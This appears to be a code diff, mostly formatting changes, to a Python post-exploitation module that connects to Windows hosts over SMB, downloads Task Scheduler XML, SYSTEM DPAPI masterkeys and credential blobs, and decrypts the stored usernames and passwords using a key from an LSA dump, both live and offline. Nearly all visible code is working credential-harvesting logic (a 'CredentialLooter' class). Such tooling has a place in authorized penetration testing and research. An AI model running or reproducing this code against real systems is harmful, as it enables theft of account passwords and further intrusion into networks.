@@ -5,6 +5,7 @@ This module implements automatic discovery, extraction, and decryption of
 Task Scheduler credentials using DPAPI masterkeys.
 """
 
+import contextlib
 import json
 import logging
 import os
@@ -25,7 +26,7 @@ class CredentialLooter:
     def __init__(self, smb_conn: ImpacketSMBConnection, dpapi_userkey: str):
         """
         Initialize credential looter
-        
+
         Args:
             smb_conn: Authenticated Impacket SMB connection
             dpapi_userkey: Hex-encoded SYSTEM dpapi_userkey from LSA dump
@@ -38,7 +39,7 @@ class CredentialLooter:
     def loot_all_credentials(self) -> List[ScheduledTaskCredential]:
         """
         Complete credential looting workflow
-        
+
         Returns:
             List of decrypted scheduled task credentials with task associations
         """
@@ -87,18 +88,18 @@ class CredentialLooter:
                     # Download task XML
                     buffer = BytesIO()
                     self.smb_conn.getFile("C$", f"Windows\\System32\\Tasks\\{filename}", buffer.write)
-                    xml_content = buffer.getvalue().decode('utf-16-le', errors='ignore')
+                    xml_content = buffer.getvalue().decode("utf-16-le", errors="ignore")
 
                     # Parse task to get UserId and LogonType
                     task_info = parse_task_xml(xml_content)
 
                     # Only track tasks that store credentials (LogonType = Password)
-                    if task_info.get('logon_type') == 'Password':
+                    if task_info.get("logon_type") == "Password":
                         self.tasks[filename] = {
-                            'name': filename,
-                            'userid': task_info.get('userid', '').lower(),
-                            'xml': xml_content,
-                            'task_info': task_info
+                            "name": filename,
+                            "userid": task_info.get("userid", "").lower(),
+                            "xml": xml_content,
+                            "task_info": task_info,
                         }
                         logging.debug(f"Task '{filename}' stores credentials for user: {task_info.get('userid')}")
 
@@ -116,9 +117,7 @@ class CredentialLooter:
             # List credential files
             files = self.smb_conn.listPath("C$", cred_path + "*")
             cred_files = [
-                f.get_longname()
-                for f in files
-                if f.get_longname() not in ['.', '..'] and f.get_filesize() < 10000
+                f.get_longname() for f in files if f.get_longname() not in [".", ".."] and f.get_filesize() < 10000
             ]
 
             logging.info(f"[*] Found {len(cred_files)} credential blobs to decrypt")
@@ -135,7 +134,7 @@ class CredentialLooter:
                     result = self.decryptor.decrypt_credential_blob(
                         blob_bytes=cred_bytes,
                         task_name="",  # Will be filled in later during association
-                        blob_path=cred_file
+                        blob_path=cred_file,
                     )
 
                     if result and result.username:
@@ -162,10 +161,10 @@ class CredentialLooter:
             # Try to find matching task by UserId
             matched = False
             for task_name, task_data in self.tasks.items():
-                task_userid = task_data['userid']
+                task_userid = task_data["userid"]
 
                 # Match full domain\user or just user
-                if cred_user == task_userid or cred_user.endswith('\\' + task_userid):
+                if cred_user == task_userid or cred_user.endswith("\\" + task_userid):
                     # Update credential with task name
                     cred.task_name = task_name
                     matched = True
@@ -182,7 +181,7 @@ class OfflineDPAPICollector:
     def __init__(self, smb_conn: ImpacketSMBConnection, output_dir: str):
         """
         Initialize offline collector
-        
+
         Args:
             smb_conn: Authenticated Impacket SMB connection
             output_dir: Directory to save collected files
@@ -195,7 +194,7 @@ class OfflineDPAPICollector:
     def collect_all_files(self) -> Dict[str, int]:
         """
         Collect all DPAPI-related files for offline decryption
-        
+
         Returns:
             Dictionary with collection statistics
         """
@@ -223,11 +222,7 @@ class OfflineDPAPICollector:
 
         logging.info(f"[+] Collection complete: {self.masterkey_count} masterkeys, {self.credential_count} credentials")
 
-        return {
-            'masterkeys': self.masterkey_count,
-            'credentials': self.credential_count,
-            'output_dir': self.output_dir
-        }
+        return {"masterkeys": self.masterkey_count, "credentials": self.credential_count, "output_dir": self.output_dir}
 
     def _collect_masterkeys(self, output_dir: str) -> None:
         """Download all SYSTEM masterkeys"""
@@ -251,7 +246,7 @@ class OfflineDPAPICollector:
 
                         # Save to disk
                         output_path = os.path.join(output_dir, filename)
-                        with open(output_path, 'wb') as f:
+                        with open(output_path, "wb") as f:
                             f.write(buffer.getvalue())
 
                         self.masterkey_count += 1
@@ -285,7 +280,7 @@ class OfflineDPAPICollector:
 
                         # Save to disk
                         output_path = os.path.join(output_dir, filename)
-                        with open(output_path, 'wb') as f:
+                        with open(output_path, "wb") as f:
                             f.write(buffer.getvalue())
 
                         self.credential_count += 1
@@ -300,7 +295,8 @@ class OfflineDPAPICollector:
     def _is_guid(self, filename: str) -> bool:
         """Check if filename looks like a GUID"""
         import re
-        guid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
+
+        guid_pattern = r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
         return bool(re.match(guid_pattern, filename.lower()))
 
     def _create_readme(self) -> None:
@@ -309,7 +305,7 @@ class OfflineDPAPICollector:
         readme_content = f"""DPAPI Files Collected for Offline Decryption
 =============================================
 
-Collection Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+Collection Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 Files Collected:
   - {self.masterkey_count} SYSTEM masterkeys (in masterkeys/)
   - {self.credential_count} credential blobs (in credentials/)
@@ -363,7 +359,7 @@ NOTES
 - See metadata.json for collection details
 """
 
-        with open(readme_path, 'w') as f:
+        with open(readme_path, "w") as f:
             f.write(readme_content)
 
         logging.debug(f"Created README: {readme_path}")
@@ -372,15 +368,15 @@ NOTES
         """Create JSON metadata file"""
         metadata_path = os.path.join(self.output_dir, "metadata.json")
         metadata = {
-            'collection_date': datetime.now().isoformat(),
-            'masterkey_count': self.masterkey_count,
-            'credential_count': self.credential_count,
-            'masterkey_location': 'C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\',
-            'credential_location': 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\',
-            'instructions': 'See README.txt for decryption instructions'
+            "collection_date": datetime.now().isoformat(),
+            "masterkey_count": self.masterkey_count,
+            "credential_count": self.credential_count,
+            "masterkey_location": "C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\",
+            "credential_location": "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\",
+            "instructions": "See README.txt for decryption instructions",
         }
 
-        with open(metadata_path, 'w') as f:
+        with open(metadata_path, "w") as f:
             json.dump(metadata, f, indent=2)
 
         logging.debug(f"Created metadata: {metadata_path}")
@@ -389,11 +385,11 @@ NOTES
 def loot_credentials(smb_conn: ImpacketSMBConnection, dpapi_userkey: str) -> List[ScheduledTaskCredential]:
     """
     Convenience function for credential looting
-    
+
     Args:
         smb_conn: Authenticated SMB connection
         dpapi_userkey: DPAPI_SYSTEM userkey from LSA dump
-    
+
     Returns:
         List of decrypted credentials with task associations
     """
@@ -404,11 +400,11 @@ def loot_credentials(smb_conn: ImpacketSMBConnection, dpapi_userkey: str) -> Lis
 def collect_dpapi_files(smb_conn: ImpacketSMBConnection, output_dir: str) -> Dict[str, int]:
     """
     Convenience function for offline DPAPI file collection
-    
+
     Args:
         smb_conn: Authenticated SMB connection
         output_dir: Directory to save collected files
-    
+
     Returns:
         Dictionary with collection statistics
     """
@@ -419,11 +415,11 @@ def collect_dpapi_files(smb_conn: ImpacketSMBConnection, output_dir: str) -> Dic
 def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[ScheduledTaskCredential]:
     """
     Decrypt previously collected DPAPI files from disk
-    
+
     Args:
         loot_dir: Directory containing collected masterkeys and credentials
         dpapi_userkey: Hex-encoded SYSTEM dpapi_userkey from LSA dump
-    
+
     Returns:
         List of decrypted credentials
     """
@@ -432,7 +428,6 @@ def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[Sched
     # Check for dpapi_loot subdirectory structure
     masterkey_dir = os.path.join(loot_dir, "masterkeys")
     credential_dir = os.path.join(loot_dir, "credentials")
-
 
     if not os.path.exists(masterkey_dir):
         logging.error(f"Masterkeys directory not found: {masterkey_dir}")
@@ -444,12 +439,10 @@ def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[Sched
         logging.info("[!] Expected directory structure: <loot_dir>/masterkeys/ and <loot_dir>/credentials/")
         return []
 
-
     # Parse dpapi_userkey
     if dpapi_userkey.startswith("0x"):
         dpapi_userkey = dpapi_userkey[2:]
     dpapi_key_bytes = unhexlify(dpapi_userkey)
-
 
     # Decrypt masterkeys from files
     logging.info("[*] Decrypting masterkeys from disk...")
@@ -468,7 +461,7 @@ def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[Sched
             # Check if it looks like a GUID
             if _is_guid_filename(filename):
                 try:
-                    with open(filepath, 'rb') as f:
+                    with open(filepath, "rb") as f:
                         mk_bytes = f.read()
 
                     mk_info = MasterkeyInfo(guid=filename.lower(), blob=mk_bytes)
@@ -508,17 +501,13 @@ def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[Sched
                 continue
 
             try:
-                with open(filepath, 'rb') as f:
+                with open(filepath, "rb") as f:
                     cred_bytes = f.read()
-
 
                 # Decrypt credential blob
                 result = _decrypt_credential_blob_offline(
-                    blob_bytes=cred_bytes,
-                    blob_path=filename,
-                    masterkeys=masterkeys
+                    blob_bytes=cred_bytes, blob_path=filename, masterkeys=masterkeys
                 )
-
 
                 if result and result.username:
                     credentials.append(result)
@@ -539,27 +528,28 @@ def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[Sched
 def _is_guid_filename(filename: str) -> bool:
     """Check if filename looks like a GUID"""
     import re
-    guid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
+
+    guid_pattern = r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
     return bool(re.match(guid_pattern, filename.lower()))
 
 
-def _decrypt_credential_blob_offline(blob_bytes: bytes, blob_path: str,
-                                      masterkeys: Dict[str, MasterkeyInfo]) -> Optional[ScheduledTaskCredential]:
+def _decrypt_credential_blob_offline(
+    blob_bytes: bytes, blob_path: str, masterkeys: Dict[str, MasterkeyInfo]
+) -> Optional[ScheduledTaskCredential]:
     """
     Decrypt a credential blob using offline masterkeys
-    
+
     This is a simplified version of DPAPIDecryptor.decrypt_credential_blob()
     that works with files instead of SMB connections
     """
     from impacket.dpapi import CREDENTIAL_BLOB, DPAPI_BLOB, CredentialFile
     from impacket.uuid import bin_to_string
 
-
     try:
         # Try to parse as CredentialFile first
         try:
             cred_file = CredentialFile(blob_bytes)
-            dpapi_blob_bytes = cred_file['Data']
+            dpapi_blob_bytes = cred_file["Data"]
             logging.debug("Parsed as CredentialFile format")
         except Exception:
             # If that fails, treat as raw DPAPI blob
@@ -568,18 +558,13 @@ def _decrypt_credential_blob_offline(blob_bytes: bytes, blob_path: str,
 
         # Parse DPAPI blob to get masterkey GUID
         dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
-        masterkey_guid = bin_to_string(dpapi_blob['GuidMasterKey']).lower()
+        masterkey_guid = bin_to_string(dpapi_blob["GuidMasterKey"]).lower()
 
         # Find corresponding masterkey
         mk_info = masterkeys.get(masterkey_guid)
         if not mk_info:
             logging.debug(f"Masterkey {masterkey_guid} not found for blob {blob_path}")
-            return ScheduledTaskCredential(
-                task_name="",
-                blob_path=blob_path,
-                target=None
-            )
-
+            return ScheduledTaskCredential(task_name="", blob_path=blob_path, target=None)
 
         # Decrypt the blob (simplified version of _decrypt_blob from decryptor.py)
         decrypted = _decrypt_dpapi_blob_data(dpapi_blob_bytes, mk_info)
@@ -609,11 +594,7 @@ def _decrypt_credential_blob_offline(blob_bytes: bytes, blob_path: str,
             password = cred_blob["Unknown3"].decode("utf-16-le", errors="ignore").rstrip("\x00")
 
         return ScheduledTaskCredential(
-            task_name=task_name,
-            blob_path=blob_path,
-            username=username,
-            password=password,
-            target=target_str
+            task_name=task_name, blob_path=blob_path, username=username, password=password, target=target_str
         )
 
     except Exception as e:
@@ -630,23 +611,22 @@ def _decrypt_dpapi_blob_data(dpapi_blob_bytes: bytes, mk_info: MasterkeyInfo) ->
     from Cryptodome.Util.Padding import unpad
     from impacket.dpapi import DPAPI_BLOB
 
-
     try:
         dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
 
         # Get algorithm info
         ALGORITHMS_DATA = {
             0x6603: (168, DES3, DES3.MODE_CBC, 8),  # CALG_3DES
-            0x6611: (128, AES, AES.MODE_CBC, 16),   # CALG_AES_128
-            0x660e: (128, AES, AES.MODE_CBC, 16),   # CALG_AES_128 (alt)
-            0x660f: (192, AES, AES.MODE_CBC, 16),   # CALG_AES_192
-            0x6610: (256, AES, AES.MODE_CBC, 16),   # CALG_AES_256
+            0x6611: (128, AES, AES.MODE_CBC, 16),  # CALG_AES_128
+            0x660E: (128, AES, AES.MODE_CBC, 16),  # CALG_AES_128 (alt)
+            0x660F: (192, AES, AES.MODE_CBC, 16),  # CALG_AES_192
+            0x6610: (256, AES, AES.MODE_CBC, 16),  # CALG_AES_256
         }
 
         # Hash algorithms
         HASH_ALGOS = {
-            0x8004: SHA1,    # CALG_SHA1
-            0x800e: SHA512,  # CALG_SHA_512
+            0x8004: SHA1,  # CALG_SHA1
+            0x800E: SHA512,  # CALG_SHA_512
         }
 
         hash_algo = HASH_ALGOS.get(dpapi_blob["HashAlgo"], SHA1)
@@ -669,15 +649,12 @@ def _decrypt_dpapi_blob_data(dpapi_blob_bytes: bytes, mk_info: MasterkeyInfo) ->
 
         key_len, cipher_algo, mode, block_size = crypto_info
 
-        cipher = cipher_algo.new(derived_key[:key_len // 8], mode=mode, iv=b"\x00" * block_size)
+        cipher = cipher_algo.new(derived_key[: key_len // 8], mode=mode, iv=b"\x00" * block_size)
         cleartext = cipher.decrypt(dpapi_blob["Data"])
 
         # Remove padding
-        try:
+        with contextlib.suppress(ValueError):
             cleartext = unpad(cleartext, block_size)
-        except ValueError:
-            # Padding may already be removed
-            pass
 
         return cleartext
 
